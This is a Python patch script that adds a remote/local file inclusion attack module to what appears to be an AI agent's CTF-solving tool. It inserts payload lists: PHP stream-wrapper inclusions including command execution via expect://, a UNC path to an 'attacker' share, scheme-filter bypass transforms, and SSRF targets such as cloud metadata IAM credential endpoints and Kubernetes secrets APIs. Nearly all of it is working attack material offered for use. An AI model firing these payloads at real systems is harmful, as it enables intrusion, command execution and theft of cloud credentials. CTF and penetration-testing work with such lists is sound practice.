#!/usr/bin/env python3
"""v7 part 1: RFI (remote/local file inclusion via URI schemes) attack engine.

Adds the remote_inclusion profile to the embedded CTF core:

  * INCLUDE_SCHEMES — every stream wrapper worth probing (php:// filter
    chains, data:, expect://, phar://, zip://, file://, compress://, ...).
  * SCHEME_FILTER_BYPASSES — obfuscations that beat naive scheme filters
    (case, whitespace, tab/newline inside scheme, backslash leaders,
    double-encoded colon, path-absolute HTTP, PHP wrapper prefix chains).
  * SSRF_TARGETS — when inclusion of http:// works, the internal network
    is the prize: cloud metadata, loopback admin panels, k8s/docker.
  * tool_http_include — fires scheme x param x route matrices through the
    SAME http_batch pipeline as the LFI traverse tool; every non-404 body
    is returned for flag extraction.
  * REMOTE_INCLUSION profile wired into PROFILES + build packaging.
"""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
P = ROOT / "app" / "agent" / "ctf" / "profiles.py"


def patch(old: str, new: str) -> None:
    s = P.read_text(encoding="utf-8")
    assert old in s, f"anchor not found: {old[:70]!r}"
    s = s.replace(old, new, 1)
    P.write_text(s, encoding="utf-8")


# ---------------------------------------------------------------- schemes
# Insert the RFI vector block right before the LFI endpoints list.
patch(
    """LFI_ENDPOINTS = [""",
    """# --------------------------------------------------------------------------
# RFI domain: URI-scheme inclusion (remote file inclusion family)
# --------------------------------------------------------------------------
# Stream wrappers worth probing when a parameter value reaches an include()
# or open() on the server. PHP wrappers first (richest attack surface),
# then generic schemes that older runtimes still honour.
INCLUDE_SCHEMES = [
    # PHP wrappers — filter chain reads SOURCE of code files (base64 line
    # chunks defeat both execution and preview truncation)
    "php://filter/convert.base64-encode/resource={res}",
    "php://filter/read=convert.base64-encode/resource={res}",
    "php://filter/convert.iconv.utf-8.utf-16/resource={res}",
    "php://filter/zlib.deflate/resource={res}",
    "php://filter/convert.base64-encode|convert.iconv.utf8.utf16|"
    "convert.base64-decode/resource={res}",
    # direct PHP I/O streams
    "php://input",
    "php://stdin",
    "php://memory",
    "php://temp",
    # data: URIs — inline "remote" payload without any egress
    "data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1BST0JFJzs/Pg==",
    "data://text/plain,{res}",
    "data:text/plain;base64,PD9waHAgZWNobyAnUkZJX1BST0JFJzs/Pg==",
    # expect:// runs a command and streams stdout (expect extension)
    "expect://id",
    "expect://cat flag.txt",
    # phar:// executes PHP metadata on deserialization paths
    "phar://{res}/.metadata",
    "phar://{res}",
    # archive wrappers — read a member of an uploaded/found archive
    "zip://{res}#flag.txt",
    "zip://file:{res}#secret.txt",
    # file:// forces the absolute-path branch even when the app prefixes
    "file://{abs}",
    "file://localhost{abs}",
    # compress wrappers unwrap a gzip/bz2 payload hiding the secret
    "compress.zlib://{res}",
    "compress.bzip2://{res}",
    # glob:// enumerates, rar:// and ogg:// exist on exotic builds
    "glob://{res}/*",
    # classic remote schemes — the R in RFI
    "http://{host}/flag.txt",
    "https://{host}/flag.txt",
    "ftp://{host}/flag.txt",
    "ssh2.exec://id",
    "ssh2.sftp://{host}/etc/passwd",
    # SMB on Windows stacks (UNC auto-auth with guest creds)
    "\\\\\\\\attacker\\\\share\\\\shell.gif",
    # web:// and svn:// survive on legacy codebases
    "web://{host}/flag.txt",
    "svn://{host}/repo/flag.txt",
]

# Obfuscations that beat scheme blacklists/regex filters. Applied to a
# scheme vector they yield semantically identical inclusion on the server.
SCHEME_FILTER_BYPASSES = [
    # case mixing
    ("{v}", lambda v: v[:5].upper() + v[5:] if "://" in v else v.upper()),
    # scheme-internal whitespace (parser folds WS inside scheme token)
    ("{v}", lambda v: v.replace("://", " ://", 1)),
    ("{v}", lambda v: v.replace("://", "\\t://", 1)),
    ("{v}", lambda v: v.replace("://", ":\\n//", 1)),
    # leading backslash or double-slash confuses "starts with scheme"
    ("{v}", lambda v: "\\\\" + v),
    ("{v}", lambda v: "//" + v),
    # double-encoded colon and slashes
    ("{v}", lambda v: v.replace("://", "%3a%2f%2f", 1)),
    ("{v}", lambda v: v.replace("://", "%253a%252f%252f", 1)),
    # scheme-relative HTTP (browser-style) when the filter demands a host
    ("http://{host}/flag.txt", lambda v: "//{host}/flag.txt"),
    # PHP filter-chain: prepend an innocent-looking wrapper
    ("php://filter/convert.base64-encode/resource={res}",
     lambda v: "php://filter/read=string.tolower|convert.base64-encode/resource={res}"),
]

# When http(s):// inclusion works, the internal network is the prize:
# metadata endpoints, loopback admin panels, orchestrator APIs.
SSRF_TARGETS = [
    # cloud metadata (IMDSv1 answers plain GET; v2 needs a token but the
    # probe itself proves egress)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://instance-data.ec2.internal/",
    "http://100.100.100.200/latest/meta-data/",
    # container orchestrators
    "http://10.96.0.1:443/",
    "https://kubernetes.default.svc/",
    "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    # loopback staples
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8500/",
    "http://localhost:2375/version",
    "http://localhost:9200/_cluster/health",
    "http://[::1]:8080/",
    "http://0.0.0.0:8000/",
    # link-local and private ranges that border the service
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.17.0.1:8080/",
]

LFI_ENDPOINTS = [""",
)

print("INCLUDE_SCHEMES + bypasses + SSRF targets inserted")
